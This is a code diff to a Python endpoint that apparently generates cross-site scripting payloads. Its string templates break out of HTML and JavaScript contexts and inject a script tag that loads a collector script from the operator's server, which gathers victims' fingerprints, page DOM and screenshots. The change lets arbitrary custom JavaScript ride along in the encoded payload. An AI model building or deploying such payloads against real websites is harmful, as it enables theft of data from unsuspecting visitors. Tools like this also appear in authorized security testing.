@@ -23,7 +23,7 @@ def xss_generate(body: XssGenerateModel):
     client: Client = db.session.query(Client).filter_by(id=body.client_id).first_or_404()
 
     if body.code_type == "html":
-        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"}:
+        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
             payload_head = f'\'>"><script src={body.url}/static/collector.min.js data="'
 
             payload_body = _generate_collector_payload_body(body, client)
@@ -59,7 +59,7 @@ def xss_generate(body: XssGenerateModel):
             return {"payload": payload}
 
     else:
-        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"}:
+        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
             payload_head = f';}};var js=document.createElement("script");js.src="{body.url}/static/collector.min.js";js.setAttribute("data", "'
 
             payload_body = _generate_collector_payload_body(body, client)
@@ -94,7 +94,7 @@ def _generate_collector_payload_body(body: XssGenerateModel, client: Client) -> 
     data_to_exclude = sorted(DATA_TO_GATHER - set(body.to_gather))
     joined_data_to_exclude = ";".join(data_to_exclude)
     joined_tags = ";".join(body.tags)
-    joined_payload_data = ",".join([body.xss_type, client.uid, joined_data_to_exclude, joined_tags])
+    joined_payload_data = ",".join([body.xss_type, client.uid, joined_data_to_exclude, joined_tags, body.custom_js])
 
     payload_body = base64.b64encode(str.encode(joined_payload_data)).decode()
     return payload_body
